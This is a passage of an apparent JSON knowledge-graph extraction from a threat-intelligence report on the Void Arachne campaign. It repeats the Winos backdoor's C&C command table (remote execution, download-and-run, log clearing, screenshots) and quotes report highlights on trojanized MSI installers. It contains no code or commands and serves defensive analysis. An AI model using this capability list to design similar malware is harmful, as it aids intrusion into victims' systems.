          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
          "chunk_length": 1248,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 227,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 33,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Registry Modification",
      "type": "Technique",
      "id": "technique--registry-modification",
      "description": "修改注册表的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "File Download",
      "type": "Technique",
      "id": "technique--file-download",
      "description": "从URL下载文件的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "System Shutdown",
      "type": "Technique",
      "id": "technique--system-shutdown",
      "description": "关闭系统的命令",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Configuration Update",
      "type": "Technique",
      "id": "technique--configuration-update",
      "description": "更新配置设置的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Process Enumeration",
      "type": "Technique",
      "id": "technique--process-enumeration",
      "description": "枚举系统进程的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Log Clearing",
      "type": "Technique",
      "id": "technique--log-clearing",
      "description": "清除系统日志的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Plugin Method Change",
      "type": "Technique",
      "id": "technique--plugin-method-change",
      "description": "更改默认插件加载方法的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "File Execution",
      "type": "Technique",
      "id": "technique--file-execution",
      "description": "执行文件的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Plugin Loading",
      "type": "Technique",
      "id": "technique--plugin-loading",
      "description": "加载插件的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Screenshot Capture",
      "type": "Technique",
      "id": "technique--screenshot-capture",
      "description": "截屏的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "C2 Thread Creation",
      "type": "Technique",
      "id": "technique--c2-thread-creation",
      "description": "创建新的C&C线程并收集系统信息的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Registry Value Setting",
      "type": "Technique",
      "id": "technique--registry-value-setting",
      "description": "设置特定注册表值的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "System Restart",
      "type": "Technique",
      "id": "technique--system-restart",
      "description": "重启系统的命令",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Registry Value Removal",
      "type": "Technique",
      "id": "technique--registry-value-removal",
      "description": "移除特定注册表值的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    }
  ],
  "relationships": [
    {
      "type": "BELONG",
      "source": "report--void-arachne-campaign",
      "target": "attack-event--msi-campaign",
      "confidence": 0.95,
      "evidence": "报告详细记录了恶意MSI文件攻击活动",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
